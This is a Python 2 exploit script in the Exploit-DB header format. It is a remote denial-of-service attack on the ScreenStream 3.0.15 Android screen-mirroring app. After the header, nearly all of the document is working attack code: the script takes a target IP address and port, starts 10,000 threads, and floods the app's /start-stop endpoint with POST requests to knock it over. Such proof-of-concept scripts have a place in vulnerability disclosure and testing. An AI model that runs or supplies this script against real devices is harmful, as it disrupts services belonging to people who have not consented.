#!/usr/bin/python
#coding: utf-8

# ************************************************************************
# *                Author: Marcelo Vázquez (aka s4vitar)                 *
# *         ScreenStream 3.0.15 Remote Denial of Service (DoS)           *
# ************************************************************************

# Exploit Title: ScreenStream 3.0.15 Remote Denial of Service (DoS)
# Date: 2019-02-21
# Exploit Author: Marcelo Vázquez (aka s4vitar)
# Vendor Homepage: http://mobzapp.com/mirroring/index.html
# Software Link: https://play.google.com/store/apps/details?id=info.dvkr.screenstream&hl=en
# Version: <= ScreenStream 3.0.15
# Tested on: Android

import sys, requests, threading, signal

def handler(signum, frame):
        print '\nFinishing program...\n'
        sys.exit(0)

if len(sys.argv) != 3:
	print "\nUsage: python " + sys.argv[0] + " <ip_address> <port>\n"
	print "Example: python " + sys.argv[0] + " 192.168.1.125 8080\n"
	sys.exit(0)

def startAttack(url):
	url_destination = url + '/start-stop'
	headers = {'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.5', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0', 'Accept': '*/*', 'Referer': url, 'Connection': 'close'}

	r = requests.post(url_destination, headers=headers)

if __name__ == '__main__':

	signal.signal(signal.SIGINT, handler)
	url = 'http://' + sys.argv[1] + ':' + sys.argv[2]

	threads = []

	for i in xrange(0, 10000):
		t = threading.Thread(target=startAttack, args=(url,))
		threads.append(t)

	for x in threads:
		x.start()

	for x in threads:
		x.join()